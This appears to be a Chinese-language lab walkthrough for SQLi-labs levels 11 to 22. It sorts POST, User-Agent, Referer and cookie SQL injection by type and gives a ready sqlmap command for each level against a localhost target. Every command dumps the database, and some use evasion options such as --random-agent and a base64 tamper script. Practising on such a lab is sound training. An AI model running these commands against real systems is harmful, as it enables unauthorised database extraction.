# POST/Header 注入 (Less-11 ~ Less-22)

## 注入类型对照

| Less | 方法   | 注入位置                | 闭合/编码       | 注入技术                            |
| ---- | ---- | ------------------- | ----------- | ------------------------------- |
| 11   | POST | `uname` 参数          | `'uname'`   | UNION                           |
| 12   | POST | `uname` 参数          | `("uname")` | UNION                           |
| 13   | POST | `uname` 参数          | `('uname')` | Error (双注入)                     |
| 14   | POST | `uname` 参数          | `"uname"`   | Error (双注入)                     |
| 15   | POST | `uname` 参数          | `'uname'`   | Boolean 盲注                      |
| 16   | POST | `uname` 参数          | `("uname")` | Boolean 盲注                      |
| 17   | POST | `uname` 参数          | UPDATE 语句   | Error                           |
| 18   | POST | User-Agent 头        | --          | UNION (需 `--level=3`)           |
| 19   | POST | Referer 头           | --          | UNION (需 `--level=3`)           |
| 20   | POST | Cookie              | --          | UNION (需 `--level=2`)           |
| 21   | POST | Cookie (Base64)     | Base64 编码   | UNION + `--tamper=base64encode` |
| 22   | POST | Cookie (Base64+双引号) | Base64 编码   | UNION + `--tamper=base64encode` |

## 关键知识

- **Header 注入 (Less-18/19)**：必须加 `--level=3`，sqlmap 默认不测试 HTTP 头
- **Cookie 注入 (Less-20/21/22)**：至少 `--level=2` 才会测试 Cookie
- **Base64 Cookie (Less-21/22)**：需配合 `--tamper=base64encode`，让 sqlmap 自动编码 payload

## 配置

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行命令

### Less-11: POST + 单引号

```bash
sqlmap -u "$TARGET/Less-11/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-11"
```

### Less-12: POST + 双引号+括号

```bash
sqlmap -u "$TARGET/Less-12/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-12"
```

### Less-13: POST + 单引号+括号 + 报错注入

```bash
sqlmap -u "$TARGET/Less-13/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-13"
```

### Less-14: POST + 双引号 + 报错注入

```bash
sqlmap -u "$TARGET/Less-14/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-14"
```

### Less-15: POST + 单引号 + 布尔盲注

```bash
sqlmap -u "$TARGET/Less-15/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-15"
```

### Less-16: POST + 双引号+括号 + 布尔盲注

```bash
sqlmap -u "$TARGET/Less-16/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-16"
```

### Less-17: POST + UPDATE 语句 + 报错注入

```bash
sqlmap -u "$TARGET/Less-17/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=5 --dbms=mysql \
    --technique=E --dump --output-dir="$RESULTS_DIR/Less-17"
```

### Less-18: POST + User-Agent 注入

```bash
sqlmap -u "$TARGET/Less-18/" \
    --data="uname=admin&passwd=admin" \
    --headers="User-Agent: test" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --level=3 --dump --output-dir="$RESULTS_DIR/Less-18"
```

### Less-19: POST + Referer 注入

```bash
sqlmap -u "$TARGET/Less-19/" \
    --data="uname=admin&passwd=admin" \
    --headers="Referer: test" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --level=3 --dump --output-dir="$RESULTS_DIR/Less-19"
```

### Less-20: POST + Cookie 注入

```bash
sqlmap -u "$TARGET/Less-20/" \
    --data="uname=admin&passwd=admin" \
    --cookie="uname=admin" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --level=2 --dump --output-dir="$RESULTS_DIR/Less-20"
```

### Less-21: POST + Cookie 注入 (Base64 编码)

```bash
sqlmap -u "$TARGET/Less-21/" \
    --data="uname=admin&passwd=admin" \
    --cookie="uname=YWRtaW4=" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --tamper=base64encode --level=2 \
    --dump --output-dir="$RESULTS_DIR/Less-21"
```

### Less-22: POST + Cookie 注入 (Base64 + 双引号)

```bash
sqlmap -u "$TARGET/Less-22/" \
    --data="uname=admin&passwd=admin" \
    --cookie="uname=YWRtaW4=" \
    --batch --random-agent --threads=10 --dbms=mysql \
    --tamper=base64encode --level=2 \
    --dump --output-dir="$RESULTS_DIR/Less-22"
```

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [注入类型详解](../notes/injection-types.md) | [靶场总览](../notes/overview.md)
